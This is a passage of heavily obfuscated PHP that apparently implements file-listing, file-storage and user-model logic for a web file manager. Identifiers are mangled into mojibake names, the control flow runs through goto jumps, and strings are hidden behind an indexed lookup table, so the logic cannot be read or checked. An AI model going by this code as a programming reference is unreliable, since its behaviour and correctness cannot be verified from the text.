intval($a¼½ØŠÜ½Ü[$cíá¹´ã­[2163]])); } unset($a¼½ØŠÜ½Ü[$cíá¹´ã­[2163]]); } if (isset($a¼½ØŠÜ½Ü[$cíá¹´ã­[2165]])) { if ($a¼½ØŠÜ½Ü[$cíá¹´ã­[2165]]) { $a¼½ØŠÜ½Ü[$cíá¹´ã­[2164]] = array($cíá¹´ã­[943], intval($a¼½ØŠÜ½Ü[$cíá¹´ã­[2165]])); } unset($a¼½ØŠÜ½Ü[$cíá¹´ã­[2165]]); } return $this->_listData($a¼½ØŠÜ½Ü); } private function _listData($aê«‚¨õƒÒ) { $FŠ»Ì¬™Ä =& $_SERVER[ã®Â„Éæ¹¤]; $Cõñ…‘âŸÄ = $this->where($aê«‚¨õƒÒ)->_makeOrder()->selectPage(100); $this->_listAppendParent($Cõñ…‘âŸÄ[$FŠ»Ì¬™Ä[354]]); $this->_listAppendUser($Cõñ…‘âŸÄ[$FŠ»Ì¬™Ä[354]]); $this->_listAppendMeta($Cõñ…‘âŸÄ[$FŠ»Ì¬™Ä[354]]); return $Cõñ…‘âŸÄ; } private function _makeOrder() { $FÁöÀ»·»‘ =& $_SERVER[ã®Â„Éæ¹¤]; $fï”»‹Øç = array($FÁöÀ»·»‘[2157], $FÁöÀ»·»‘[2156], $FÁöÀ»·»‘[187]); $A™ÑãŞ¼ƒé = Input::get($FÁöÀ»·»‘[407], $FÁöÀ»·»‘[7], $FÁöÀ»·»‘[389], $fï”»‹Øç); $föÃîØ„ÇÍ = Input::get($FÁöÀ»·»‘[408], $FÁöÀ»·»‘[7], $FÁöÀ»·»‘[1449], array($FÁöÀ»·»‘[2166], $FÁöÀ»·»‘[405])); $Aˆä¬†Ê»¹ = $A™ÑãŞ¼ƒé . $FÁöÀ»·»‘[50] . $föÃîØ„ÇÍ; return $this->order($Aˆä¬†Ê»¹); } private function _listAppendParent(&$a°²¯¬ğäÏ) { goto eâëáŒìˆÄ; Dä«Õã–¢Š: foreach ($a°²¯¬ğäÏ as &$f›¼Éˆ·Ã) { if (isset($A“àŒ–—°[$f›¼Éˆ·Ã[$d‡ÌŞßÒƒ[2154]]])) { $f›¼Éˆ·Ã[$d‡ÌŞßÒƒ[2167]] = $A“àŒ–—°[$f›¼Éˆ·Ã[$d‡ÌŞßÒƒ[2154]]]; } } unset($f›¼Éˆ·Ã); goto CÉÓ™‰Ã‡ö; eâëáŒìˆÄ: $d‡ÌŞßÒƒ =& $_SERVER[ã®Â„Éæ¹¤]; $a÷ñå·¿©± = array_unique(array_to_keyvalue($a°²¯¬ğäÏ, $d‡ÌŞßÒƒ[33], $d‡ÌŞßÒƒ[2154])); $a÷ñå·¿©± = array_remove_value($a÷ñå·¿©±, $d‡ÌŞßÒƒ[470]); goto f òºÎ…ßÆ; f òºÎ…ßÆ: if (!$a÷ñå·¿©±) { return; } $A“àŒ–—° = $this->where(array($d‡ÌŞßÒƒ[2155] => array($d‡ÌŞßÒƒ[7], $a÷ñå·¿©±)))->select(); $A“àŒ–—° = array_to_keyvalue($A“àŒ–—°, $d‡ÌŞßÒƒ[2164]); goto Dä«Õã–¢Š; CÉÓ™‰Ã‡ö: } private function _listAppendUser(&$bÈ›Á¬Ë£) { goto E¡³ÀÌº¡Ë; aÄ³„ÅÅäÃ: if (count($d³Ÿ†¸Ãê×) == 0) { return; } foreach ($bÈ›Á¬Ë£ as $Aîİ’ÑëØ ) { if (isset($Aîİ’ÑëØ [$E¤ƒ•ÜÆö¹[2167]])) { $d³Ÿ†¸Ãê×[] = $Aîİ’ÑëØ [$E¤ƒ•ÜÆö¹[2167]][$E¤ƒ•ÜÆö¹[1456]]; } } $b×¯“ ‚‡º = Model($E¤ƒ•ÜÆö¹[479])->userListInfo($d³Ÿ†¸Ãê×); goto EÀÒŒ¼¶—Ã; E¡³ÀÌº¡Ë: $E¤ƒ•ÜÆö¹ =& $_SERVER[ã®Â„Éæ¹¤]; $d³Ÿ†¸Ãê× = array_unique(array_to_keyvalue($bÈ›Á¬Ë£, $E¤ƒ•ÜÆö¹[33], $E¤ƒ•ÜÆö¹[1456])); $d³Ÿ†¸Ãê× = array_remove_value($d³Ÿ†¸Ãê×, $E¤ƒ•ÜÆö¹[470]); goto aÄ³„ÅÅäÃ; EÀÒŒ¼¶—Ã: foreach ($bÈ›Á¬Ë£ as &$Aîİ’ÑëØ ) { $Aîİ’ÑëØ [$E¤ƒ•ÜÆö¹[536]] = $b×¯“ ‚‡º[$Aîİ’ÑëØ [$E¤ƒ•ÜÆö¹[1456]]]; if (isset($Aîİ’ÑëØ [$E¤ƒ•ÜÆö¹[2167]])) { $Aîİ’ÑëØ [$E¤ƒ•ÜÆö¹[2167]][$E¤ƒ•ÜÆö¹[536]] = $b×¯“ ‚‡º[$Aîİ’ÑëØ [$E¤ƒ•ÜÆö¹[2167]][$E¤ƒ•ÜÆö¹[1456]]]; } } unset($Aîİ’ÑëØ ); goto fñÙÜ÷ğó; fñÙÜ÷ğó: } private function _listAppendMeta(&$fÚ½Ò»õ²) { goto B“ŠîŸÒòĞ; B“ŠîŸÒòĞ: $FíæÎêï =& $_SERVER[ã®Â„Éæ¹¤]; $DòÁ¹ŠÂâµ = array_unique(array_to_keyvalue($fÚ½Ò»õ², $FíæÎêï[33], $FíæÎêï[2164])); $DòÁ¹ŠÂâµ = array_remove_value($DòÁ¹ŠÂâµ, $FíæÎêï[470]); goto e­–ğÈ°­Í; e­–ğÈ°­Í: if (!$DòÁ¹ŠÂâµ) { return; } foreach ($fÚ½Ò»õ² as $A¸Ï„ŞÔ¯) { if (isset($A¸Ï„ŞÔ¯[$FíæÎêï[2167]])) { $DòÁ¹ŠÂâµ[] = $A¸Ï„ŞÔ¯[$FíæÎêï[2167]][$FíæÎêï[2164]]; } } $e•÷³–•”Š = $this->metaList($DòÁ¹ŠÂâµ); goto b”Ú„£’Š; b”Ú„£’Š: if (!$e•÷³–•”Š) { return !1; } foreach ($fÚ½Ò»õ² as &$A¸Ï„ŞÔ¯) { $A¸Ï„ŞÔ¯[$FíæÎêï[417]] = $e•÷³–•”Š[$A¸Ï„ŞÔ¯[$FíæÎêï[2164]]]; if (isset($A¸Ï„ŞÔ¯[$FíæÎêï[2167]])) { $A¸Ï„ŞÔ¯[$FíæÎêï[2167]][$FíæÎêï[417]] = $e•÷³–•”Š[$A¸Ï„ŞÔ¯[$FíæÎêï[2167]][$FíæÎêï[2164]]]; } } unset($A¸Ï„ŞÔ¯); goto bİºº’¬‹¤; bİºº’¬‹¤: } private function metaList($C“­³Æ‘Ê¯) { goto e¢ÔÚ÷“Ğ‘; a›œç¾”š×: $c‚ãğš‡ò… = Model($DäÏ¿…õ¹·[2168])->where($bî‚ï——ò)->select(); $c‚ãğš‡ò… = array_to_keyvalue_group($c‚ãğš‡ò…, $DäÏ¿…õ¹·[2164]); foreach ($c‚ãğš‡ò… as $DÔ–³¿Ç‰Ë => $dÜ¼Ê”İÍÇ) { $d²ã¡ŠæÜ¶ = array(); foreach ($dÜ¼Ê”İÍÇ as $aƒß³–ª¯Ì) { $d²ã¡ŠæÜ¶[$aƒß³–ª¯Ì[$DäÏ¿…õ¹·[89]]] = $aƒß³–ª¯Ì[$DäÏ¿…õ¹·[359]]; } $c‚ãğš‡ò…[$DÔ–³¿Ç‰Ë] = $d²ã¡ŠæÜ¶; } goto D¬Ôº¡’­¬; e¢ÔÚ÷“Ğ‘: $DäÏ¿…õ¹· =& $_SERVER[ã®Â„Éæ¹¤]; if (!$C“­³Æ‘Ê¯) { return array(); } $bî‚ï——ò = array($DäÏ¿…õ¹·[2164] => array($DäÏ¿…õ¹·[7], $C“­³Æ‘Ê¯)); goto a›œç¾”š×; D¬Ôº¡’­¬: return $c‚ãğš‡ò… ? $c‚ãğš‡ò… : array(); goto fµ°—”ªªÀ; fµ°—”ªªÀ: } } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\146\151\154\145"; protected $tableMeta = array("\x74\141\x62\x6c\145\116\x61\x6d\145" => "\x69\x6f\x5f\146\x69\154\x65\x5f\x6d\x65\164\141", "\155\145\x74\141\x46\x69\145\x6c\144" => "\x66\x69\x6c\145\111\x44"); public function fileInfo($f÷ô­‡ÊïÜ) { $D™£Ö‡’ =& $_SERVER[ã®Â„Éæ¹¤]; static $eÁæóµñï‹ = array(); if (!isset($eÁæóµñï‹[$f÷ô­‡ÊïÜ])) { $D©æÃ„áË© = $D™£Ö‡’[2169]; $BÕÍè…‡ØŸ = Model($D™£Ö‡’[422])->field($D©æÃ„áË©)->where(array($D™£Ö‡’[420] => $f÷ô­‡ÊïÜ))->find(); $eÁæóµñï‹[$f÷ô­‡ÊïÜ] = $BÕÍè…‡ØŸ; } return $eÁæóµñï‹[$f÷ô­‡ÊïÜ]; } public function addFileByContent($e…Éâ²„¾ù = '', $fˆ‡™îáª† = '') { goto EÔÍãğŸê; dÀÎé»¿å¼: if (file_exists($DÂøóù½ô)) { @unlink($DÂøóù½ô); } return $e–¹á¹ŠĞÊ; goto Dô†êÕèÚ; AÎÎŸâš³: $DÂøóù½ô = $bŠŸ“ÖÁÍ‚ . $bÃ¦Í¡ÀÁÎ[2171] . rand_string(16); file_put_contents($DÂøóù½ô, $e…Éâ²„¾ù); $e–¹á¹ŠĞÊ = $this->addFile($DÂøóù½ô, $fˆ‡™îáª†, !0); goto dÀÎé»¿å¼; EÔÍãğŸê: $bÃ¦Í¡ÀÁÎ =& $_SERVER[ã®Â„Éæ¹¤]; $bŠŸ“ÖÁÍ‚ = TEMP_PATH . $bÃ¦Í¡ÀÁÎ[2170]; if (!is_dir($bŠŸ“ÖÁÍ‚)) { mk_dir($bŠŸ“ÖÁÍ‚); } goto AÎÎŸâš³; Dô†êÕèÚ: } public function createFileName($AíÚçÔ¡ù©) { goto aÔœÒ‡ —; fîØ©Êöâ½: $Eô„­šÚ = $cßÂËŞÈË…->pathFather($D³ßÎËñ¿Œ); static $b‰ÆÃ·†ø™ = false; $DÅä¢¦â¸Ú = $Cš«Ôå™éê[2172] . md5($Eô„­šÚ); goto dš—¼ïÀ¼“; dš—¼ïÀ¼“: if (!$b‰ÆÃ·†ø™ && !Cache::get($DÅä¢¦â¸Ú)) { $b‰ÆÃ·†ø™ = !0; $FĞ‰…šÇŠ = IO::mkdir($Eô„­šÚ); if (!IO::exist($FĞ‰…šÇŠ . $Cš«Ôå™éê[2173])) { IO::mkfile($FĞ‰…šÇŠ . $Cš«Ôå™éê[2173]); } Cache::set($DÅä¢¦â¸Ú, 1, 3600 * 2); } return $D³ßÎËñ¿Œ; goto CÈİµ§¬Ø²; aÔœÒ‡ —: $Cš«Ôå™éê =& $_SERVER[ã®Â„Éæ¹¤]; $cßÂËŞÈË… = IO::init($Cš«Ôå™éê[8]); $D³ßÎËñ¿Œ = $this->makeFilePath($AíÚçÔ¡ù©, $cßÂËŞÈË…); goto fîØ©Êöâ½; CÈİµ§¬Ø²: } public function makeFilePath($F¢‡óöâˆß, $dŞòÕ°¼È) { goto DˆÔ ˆÓŞÙ; DˆÔ ˆÓŞÙ: $bèŞ·Ì =& $_SERVER[ã®Â„Éæ¹¤]; $dë„Ø Ô·¡ = Model($bèŞ·Ì[1107])->get($bèŞ·Ì[2174]); $b»–¸î¯¬Ê = KodIO::defaultIO() . date($bèŞ·Ì[2175]); goto Eìè¿•à; D¤ÜÀ¸ÛŠÆ: switch ($dë„Ø Ô·¡) { case $bèŞ·Ì[2177]: $C êäøß¤ = $C êäøß¤ . $bèŞ·Ì[91] . $dŞòÕ°¼È->ext($F¢‡óöâˆß); if ($dŞòÕ°¼È->ext($F¢‡óöâˆß) == $bèŞ·Ì[2117]) { $C êäøß¤ .= $bèŞ·Ì[1358]; } break; case $bèŞ·Ì[2178]: goto eÓïºó…ƒÑ; eÓïºó…ƒÑ: $C’øØÚ½Ê = Model($bèŞ·Ì[1107])->get($bèŞ·Ì[1354]); $F‘‚Œõ„‚Æ = substr(md5($bèŞ·Ì[1936] . $C’øØÚ½Ê . date($bèŞ·Ì[709])), 0, 8); $D«è¾è˜˜¿ = KodIO::defaultDriver(); goto b´èšŒÙÙ³; Cİ“Œò‡–¶: if (IO::isTypeObject($C êäøß¤) && !IO::isUploadServer($C êäøß¤)) { IO::setContent($C êäøß¤, $bèŞ·Ì[33]); } CacheLock::unlock($fÇ«ã¿’Ğ); break; goto f¨µĞµíáª; b´èšŒÙÙ³: $b»–¸î¯¬Ê = $bèŞ·Ì[2179] . $D«è¾è˜˜¿[$bèŞ·Ì[367]] . $bèŞ·Ì[2180] . date($bèŞ·Ì[2181]) . $F‘‚Œõ„‚Æ . $bèŞ·Ì[8]; if ($dŞòÕ°¼È->ext($F¢‡óöâˆß) == $bèŞ·Ì[2117]) { $F¢‡óöâˆß .= $bèŞ·Ì[1358]; } $fÇ«ã¿’Ğ = $bèŞ·Ì[2182] . $b»–¸î¯¬Ê . $F¢‡óöâˆß; goto DŸÈ¶ŸŠ„œ; DŸÈ¶ŸŠ„œ: CacheLock::lock($fÇ«ã¿’Ğ); $Cï¢ƒëÆœ„ = IO::fileNameAuto($b»–¸î¯¬Ê, $F¢‡óöâˆß); $C êäøß¤ = $b»–¸î¯¬Ê . $Cï¢ƒëÆœ„; goto Cİ“Œò‡–¶; f¨µĞµíáª: case $bèŞ·Ì[2176]: break; default: break; } return $C êäøß¤; goto DÉ£´±İ¾ï; Eìè¿•à: $C êäøß¤ = $b»–¸î¯¬Ê . rand_string(5) . short_id(100); $F¢‡óöâˆß = str_replace($bèŞ·Ì[8], $bèŞ·Ì[70], KodIO::clear($F¢‡óöâˆß)); if (!$F¢‡óöâˆß) { $dë„Ø Ô·¡ = $bèŞ·Ì[2176]; } goto D¤ÜÀ¸ÛŠÆ; DÉ£´±İ¾ï: } public function addFileByRemote($cª—š†’, $C¿ÏÏÓäÅ, $cë½Çò§Ì = array()) { goto eÓ‰šíîŠ½; a´´¦èÓ»Ç: $e‹ƒïÜÈ« = IO::hashMd5($cª—š†’, $fŠ×í¯††¥); $d¨÷éƒÕó = KodIO::defaultDriver(); $a£°ê÷Ÿó = array($bîùåë‹……[522] => IO::size($cª—š†’), $bîùåë‹……[2183] => 1, $bîùåë‹……[386] => $C¿ÏÏÓäÅ, $bîùåë‹……[758] => $d¨÷éƒÕó[$bîùåë‹……[367]], $bîùåë‹……[387] => $cª—š†’, $bîùåë‹……[2184] => $cë½Çò§Ì[$bîùåë‹……[164]] ? $cë½Çò§Ì[$bîùåë‹……[164]] : IO::hashSimple($cª—š†’), $bîùåë‹……[2185] => $e‹ƒïÜÈ« ? $e‹ƒïÜÈ« : $fŠ×í¯††¥); goto Dáì¬‹×Ó„; Dáì¬‹×Ó„: if ($fÊ¥Ê„‹î = $this->addFileCheckExist($a£°ê÷Ÿó[$bîùåë‹……[164]], $a£°ê÷Ÿó[$bîùåë‹……[163]], $a£°ê÷Ÿó[$bîùåë‹……[77]])) { return $fÊ¥Ê„‹î; } return $this->addFileData($a£°ê÷Ÿó); goto CÈŒ§¨°Ê; eÓ‰šíîŠ½: $bîùåë‹…… =& $_SERVER[ã®Â„Éæ¹¤]; if (!IO::exist($cª—š†’)) { return !1; } $fŠ×í¯††¥ = $cë½Çò§Ì[$bîùåë‹……[163]] ? $cë½Çò§Ì[$bîùåë‹……[163]] : $bîùåë‹……[33]; goto a´´¦èÓ»Ç; CÈŒ§¨°Ê: } private function addFileData($dä÷¬ÎÒÒ) { $b‘¤ò·Ô°¿ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$dä÷¬ÎÒÒ) { return !1; } $dä÷¬ÎÒÒ[$b‘¤ò·Ô°¿[77]] = intval($dä÷¬ÎÒÒ[$b‘¤ò·Ô°¿[77]]); if (!$dä÷¬ÎÒÒ[$b‘¤ò·Ô°¿[77]] && strlen($dä÷¬ÎÒÒ[$b‘¤ò·Ô°¿[164]]) > 32) { $dä÷¬ÎÒÒ[$b‘¤ò·Ô°¿[77]] = intval(substr($dä÷¬ÎÒÒ[$b‘¤ò·Ô°¿[164]], 32)); } $Bæàó·åËÆ = $this->add($dä÷¬ÎÒÒ); return $this->find($Bæàó·åËÆ); } public function addFile($dâ–ğáÚ¨è, $A÷Í“¶©Á£, $dÔè­Û¥é‘ = false) { goto B½™ƒ¯Æ®; B½™ƒ¯Æ®: $cõëçÆ˜ÌÏ = IO::hashSimple($dâ–ğáÚ¨è); $e¦óøî×â = IO::hashMd5($dâ–ğáÚ¨è); $B¤‚ô´éöÅ = IO::size($dâ–ğáÚ¨è); goto Bº‘¦…ÚÈ; Bº‘¦…ÚÈ: $fÏ›à¦ª­º = $_SERVER[ã®Â„Éæ¹¤][2186] . $e¦óøî×â; CacheLock::lock($fÏ›à¦ª­º); if ($BÔ‹¾…£Ò = $this->addFileCheckExist($cõëçÆ˜ÌÏ, $e¦óøî×â, $B¤‚ô´éöÅ)) { CacheLock::unlock($fÏ›à¦ª­º); return $BÔ‹¾…£Ò; } goto C’Œ¿„ÕÜ; C’Œ¿„ÕÜ: $DÀø›­ËŠÜ = $this->addFileMake($dâ–ğáÚ¨è, $B¤‚ô´éöÅ, $cõëçÆ˜ÌÏ, $e¦óøî×â, $A÷Í“¶©Á£, $dÔè­Û¥é‘); $DìêÇˆ¸×­ = $this->addFileData($DÀø›­ËŠÜ); CacheLock::unlock($fÏ›à¦ª­º); goto B†’ç¥ì§¶; B†’ç¥ì§¶: return $DìêÇˆ¸×­; goto eÂòÑÕ †; eÂòÑÕ †: } public function addFileMake($Fğ§©’öÂ÷, $dŠ¨êÑÈÜ, $D®—‘°Ğ¶, $eØ½¬–™±Í, $Fˆ ˜„Ğ´, $E¯ì¼²¿±ö) { goto f‰¾™êªì‘; f‰¾™êªì‘: $dåá°¤Øê =& $_SERVER[ã®Â„Éæ¹¤]; $f»†ø†Ñ÷ = $this->createFileName($Fˆ ˜„Ğ´); $eŠèˆ¯Ğõ² = get_path_father($f»†ø†Ñ÷); goto f£éâËà­; f£éâËà­: $Eº“ğ›Ïöò = get_path_this($f»†ø†Ñ÷); if ($E¯ì¼²¿±ö) { $díÌ´Áè±é = IO::move($Fğ§©’öÂ÷, $eŠèˆ¯Ğõ², !1, $Eº“ğ›Ïöò); } else { $díÌ´Áè±é = IO::copy($Fğ§©’öÂ÷, $eŠèˆ¯Ğõ², !1, $Eº“ğ›Ïöò); } if (!$díÌ´Áè±é) { return !1; } goto AåÖôÓ ß˜; AåÖôÓ ß˜: $cÔè¶‚ºš¹ = KodIO::defaultDriver(); $D©Ú„ŠÜëª = array($dåá°¤Øê[522] => $dŠ¨êÑÈÜ, $dåá°¤Øê[2183] => 1, $dåá°¤Øê[386] => $Fˆ ˜„Ğ´, $dåá°¤Øê[758] => $cÔè¶‚ºš¹[$dåá°¤Øê[367]], $dåá°¤Øê[387] => $f»†ø†Ñ÷, $dåá°¤Øê[2184] => $D®—‘°Ğ¶, $dåá°¤Øê[2185] => $eØ½¬–™±Í); return $D©Ú„ŠÜëª; goto fœŒ–±©Ûˆ; fœŒ–±©Ûˆ: } public function addFileCheckExist($e§íçŸ™ù, $CàéÛ¸÷‡, $Dù´ÖÊŞ“â) { $FŸ‡ƒÇ™ =& $_SERVER[ã®Â„Éæ¹¤]; $B·è®ù˜§ = $this->findByHash($e§íçŸ™ù, $CàéÛ¸÷‡); if (!$B·è®ù˜§) { return !1; } $bÉ—á÷…  = array($FŸ‡ƒÇ™[2183] => intval($B·è®ù˜§[$FŸ‡ƒÇ™[2187]]) + 1, $FŸ‡ƒÇ™[522] => $Dù´ÖÊŞ“â); $this->where(array($FŸ‡ƒÇ™[420] => $B·è®ù˜§[$FŸ‡ƒÇ™[419]]))->save($bÉ—á÷… ); return $B·è®ù˜§; } public function remove($FŒŸÏÂ¦ê) { $this->linkCountChange($FŒŸÏÂ¦ê, !1); $this->clearEmpty(); return !0; } public function linkAdd($d¯…”¬¸¦) { $this->linkCountChange($d¯…”¬¸¦, !0); } public function linkCountChange($E³Ø‡ê©›Š, $FÚã›Äİ„î) { goto Eí±ÈÃÔ­; C¾ŸîÙİ¾ç: foreach ($A¨ïõÙÔÀ˜ as $AœƒÄòù => $aõ¦²Ú¡°ß) { $bÁ¤öÔÌä§ = $aõ¦²Ú¡°ß . $Bí£“‘¨óì[33]; if (!$C“Æø¾®‡ì[$bÁ¤öÔÌä§]) { $C“Æø¾®‡ì[$bÁ¤öÔÌä§] = array(); } $C“Æø¾®‡ì[$bÁ¤öÔÌä§][] = $AœƒÄòù; } foreach ($C“Æø¾®‡ì as $aõ¦²Ú¡°ß => $B„ïç«¢À) { if (!$B„ïç«¢À) { continue; } $aõ¦²Ú¡°ß = $FÚã›Äİ„î ? $aõ¦²Ú¡°ß : -intval($aõ¦²Ú¡°ß); $aÛæÂµ“É = array($Bí£“‘¨óì[419] => array($Bí£“‘¨óì[7], $B„ïç«¢À)); if ($aõ¦²Ú¡°ß < 0) { $aÛæÂµ“É[$Bí£“‘¨óì[2187]] = array($Bí£“‘¨óì[947], abs($aõ¦²Ú¡°ß)); } $this->where($aÛæÂµ“É)->setAdd($Bí£“‘¨óì[2187], $aõ¦²Ú¡°ß); } goto C—”Ñ¨©³; Eí±ÈÃÔ­: $Bí£“‘¨óì =& $_SERVER[ã®Â„Éæ¹¤]; if (!$E³Ø‡ê©›Š) { return; } if (!is_array($E³Ø‡ê©›Š)) { $E³Ø‡ê©›Š = array($E³Ø‡ê©›Š); } goto A˜›òº…àÄ; A˜›òº…àÄ: $A¨ïõÙÔÀ˜ = array(); foreach ($E³Ø‡ê©›Š as $AœƒÄòù) { $bÁ¤öÔÌä§ = $AœƒÄòù . $Bí£“‘¨óì[33]; if (!$A¨ïõÙÔÀ˜[$bÁ¤öÔÌä§]) { $A¨ïõÙÔÀ˜[$bÁ¤öÔÌä§] = 0; } $A¨ïõÙÔÀ˜[$bÁ¤öÔÌä§]++; } $C“Æø¾®‡ì = array(); goto C¾ŸîÙİ¾ç; C—”Ñ¨©³: } public function findByHash($B·ÏÄÛ¸¢¬, $EíæÅ»İ = false) { $FÅßŸõŸ± =& $_SERVER[ã®Â„Éæ¹¤]; if (!$B·ÏÄÛ¸¢¬ && !$EíæÅ»İ) { return !1; } $CÆ¹Û¶‡ñÑ = array($FÅßŸõŸ±[2184] => $B·ÏÄÛ¸¢¬); if ($EíæÅ»İ) { $CÆ¹Û¶‡ñÑ = array($FÅßŸõŸ±[2185] => $EíæÅ»İ); } return $this->order($FÅßŸõŸ±[2188])->where($CÆ¹Û¶‡ñÑ)->find(); } public function clearEmpty($C“‡Ì­ÏÖƒ = 0) { goto C£È¤ÜÂ·¦; C£È¤ÜÂ·¦: $fŒ¨Ñ×á£¢ =& $_SERVER[ã®Â„Éæ¹¤]; $e¯åİâÃ–Ä = time() - 3600 * 24 * $C“‡Ì­ÏÖƒ; $aéÈÀêº£° = $fŒ¨Ñ×á£¢[2189] . $e¯åİâÃ–Ä; goto EÎ‡‰’ùÀÒ; A®ö¹É‡ñ‹: foreach ($fîº¿«‰ó´ as $Eˆ‹’öÅ¸„) { $bµ¼£‘¨·„->update(1); $this->resetFile($Eˆ‹’öÅ¸„); } $bµ¼£‘¨·„->end(); goto fŸÌÑ«Ö½; EÎ‡‰’ùÀÒ: $fîº¿«‰ó´ = $this->where($aéÈÀêº£°)->select(); if (!$fîº¿«‰ó´) { return; } $bµ¼£‘¨·„ = new Task($fŒ¨Ñ×á£¢[2190], $fŒ¨Ñ×á£¢[33], count($fîº¿«‰ó´)); goto A®ö¹É‡ñ‹; fŸÌÑ«Ö½: } public function resetFile($dêæ„¯˜ƒ³) { goto E‰œŠ¶Úù; AÈ³Òšì¨: if ($dêæ„¯˜ƒ³[$bÜñò¬òÇÖ[2187]] != $EµÜÈÁì) { $this->where($b–©ç‘ô³ˆ)->save(array($bÜñò¬òÇÖ[2183] => $EµÜÈÁì)); } goto D³§©ŒÅÀ; DÈ¤’Ô¤ : $DáæÅ¶ô¬ƒ = Model($bÜñò¬òÇÖ[2191])->where($b–©ç‘ô³ˆ)->count(); $EµÜÈÁì = intval($d¬ˆÄœ²ˆ¿) + intval($DáæÅ¶ô¬ƒ); if ($EµÜÈÁì == 0) { IO::remove($dêæ„¯˜ƒ³[$bÜñò¬òÇÖ[75]]); $this->where($b–©ç‘ô³ˆ)->delete(); $this->metaSet($dêæ„¯˜ƒ³[$bÜñò¬òÇÖ[419]], null, null); return; } goto AÈ³Òšì¨; E‰œŠ¶Úù: $bÜñò¬òÇÖ =& $_SERVER[ã®Â„Éæ¹¤]; $b–©ç‘ô³ˆ = array($bÜñò¬òÇÖ[420] => $dêæ„¯˜ƒ³[$bÜñò¬òÇÖ[419]]); $d¬ˆÄœ²ˆ¿ = Model($bÜñò¬òÇÖ[1136])->where($b–©ç‘ô³ˆ)->count(); goto DÈ¤’Ô¤ ; D³§©ŒÅÀ: } public function storageInfo($E¿Ãõœ¬î = false) { goto c¢‰Ş™¡š; dËĞ„œà¤Ö: $b¥—ñ§§«à = 1; $aÄÖß¥¿ = 0; $D¿ÃÌ’— = 5000; goto cœ­‰Áå‹‰; c¢‰Ş™¡š: $D´ªªŠÈË» =& $_SERVER[ã®Â„Éæ¹¤]; $dÛéƒ±ºš• = $this->count() + 0.0; $E¬Ú¤³âù° = 0; goto dËĞ„œà¤Ö; cœ­‰Áå‹‰: for ($D†²ÂçµŒ­ = 0; $D†²ÂçµŒ­ < $dÛéƒ±ºš•; $D†²ÂçµŒ­ = $D†²ÂçµŒ­ + $D¿ÃÌ’—) { $FôïŒÉÉÌ = $this->limit($D†²ÂçµŒ­, $D†²ÂçµŒ­ + $D¿ÃÌ’—)->select(); foreach ($FôïŒÉÉÌ as $F®ğİ†¡óË) { $b¥—ñ§§«à += $F®ğİ†¡óË[$D´ªªŠÈË»[77]] * $F®ğİ†¡óË[$D´ªªŠÈË»[2187]]; $E¬Ú¤³âù° += $F®ğİ†¡óË[$D´ªªŠÈË»[77]] * ($F®ğİ†¡óË[$D´ªªŠÈË»[2187]] - 1); $aÄÖß¥¿ += $F®ğİ†¡óË[$D´ªªŠÈË»[2187]]; } } $A½é¢¸ºê = array($D´ªªŠÈË»[2192] => $b¥—ñ§§«à, $D´ªªŠÈË»[2193] => $E¬Ú¤³âù°, $D´ªªŠÈË»[2194] => $E¬Ú¤³âù° / $b¥—ñ§§«à, $D´ªªŠÈË»[81] => $dÛéƒ±ºš•, $D´ªªŠÈË»[2195] => $aÄÖß¥¿); return $A½é¢¸ºê; goto EÆ¶‰¼è¹¶; EÆ¶‰¼è¹¶: } } goto D¼¨¹êØËæ; d«™ºÖ²º±: class UserModel extends ModelBase { protected $tableName = "\165\x73\145\x72"; protected $tableMeta = array("\x74\141\x62\x6c\x65\x4e\x61\155\x65" => "\x75\x73\x65\162\x5f\155\x65\x74\x61", "\x6d\145\164\x61\x46\x69\145\154\x64" => "\x75\x73\x65\162\x49\x44"); protected $simpleField = "\x75\x73\x65\162\x49\104\54\156\151\143\x6b\x4e\141\x6d\145\54\x6e\x61\155\145\54\141\x76\x61\x74\141\x72\54\x73\x65\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($C‰Õøğ‹–‰) { $Dõäˆˆš« =& $_SERVER[ã®Â„Éæ¹¤]; $f—‘–ìóÊ = $Dõäˆˆš«[2541]; return array($Dõäˆˆš«[2196] => array($C‰Õøğ‹–‰[0], $f—‘–ìóÊ), $Dõäˆˆš«[2198] => array($C‰Õøğ‹–‰[0], $f—‘–ìóÊ), $Dõäˆˆš«[2542] => array($C‰Õøğ‹–‰[0], $f—‘–ìóÊ)); } protected function getInfo($c¸–Ú½»›±, $C²ãÎ¡Ø = false) { $E“í¶çï»È = $this->getInfoSimple($c¸–Ú½»›±); if (!is_array($E“í¶çï»È)) { return array(); } if ($C²ãÎ¡Ø) { return $this->_getInfoApply($E“í¶çï»È); } return $this->cacheFunctionGet($_SERVER[ã®Â„Éæ¹¤][2252], $c¸–Ú½»›±); } protected function getInfoFull($dØ°õ´™¿¹, $EÓôùîòØ¿ = false) { $EˆÓÚ†Æ¤¯ = $this->getInfoSimple($dØ°õ´™¿¹); if (!is_array($EˆÓÚ†Æ¤¯)) { return array(); } if ($EÓôùîòØ¿) { return $this->_getInfoApply($EˆÓÚ†Æ¤¯, !0); return $this->_getInfoApply($EˆÓÚ†Æ¤¯, !0); } return $this->cacheFunctionGet($_SERVER[ã®Â„Éæ¹¤][2543], $dØ°õ´™¿¹); } private function _getInfoApply($Cæªİ÷¶ƒ¿, $D„À·Ş°®â = false) { goto Eœ†ãŸÚŸ¹; Eœ†ãŸÚŸ¹: $Eœù”ÀùÅ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$Cæªİ÷¶ƒ¿) { return $Cæªİ÷¶ƒ¿; } $cÖë¾Ÿƒ’¦ = md5($Eœù”ÀùÅ[2544] . $Cæªİ÷¶ƒ¿[$Eœù”ÀùÅ[823]] . $Eœù”ÀùÅ[2545] . $Cæªİ÷¶ƒ¿[$Eœù”ÀùÅ[28]]); goto aÑÊ²¼×íÂ; A›Ï‰½®ºÕ: $Cæªİ÷¶ƒ¿[$Eœù”ÀùÅ[391]][$Eœù”ÀùÅ[2381]] = isset($AÌÛùÂŞ…Å[$Eœù”ÀùÅ[2382]]) ? $AÌÛùÂŞ…Å[$Eœù”ÀùÅ[2382]] : null; if ($D„À·Ş°®â) { 